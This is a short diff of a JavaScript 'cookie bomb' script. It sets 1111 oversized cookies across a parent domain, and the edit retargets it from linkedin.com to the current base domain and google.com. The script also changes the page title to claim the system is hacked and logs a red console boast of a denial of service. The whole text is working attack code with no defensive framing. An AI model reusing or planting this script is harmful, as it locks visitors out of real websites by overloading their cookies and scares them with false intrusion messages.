@@ -14,7 +14,8 @@
      var serang = Array(1111).join('a');
    var base_domain = document.domain.substr(document.domain.indexOf('.'));
 for (var x = 0; x < 1111; x++){
-document.cookie = "Bomber" + x + "=" + serang + ";Domain=" + ".linkedin.com";
+document.cookie = "Bomber" + x + "=" + serang + ";Domain=" + base_domain;
+ document.cookie = "Bomber" + x + "=" + serang + ";Domain=.google.com; path=/";
    document.title = "[Your system has been hacked] - paktiko was here";
  //history.back();
    console.log("%c Your system has been injected by M4lw4r3. And you're not able to do anymore. Denial fo Service. \nI watch you!!!!", "color:red; font-size:25pt");
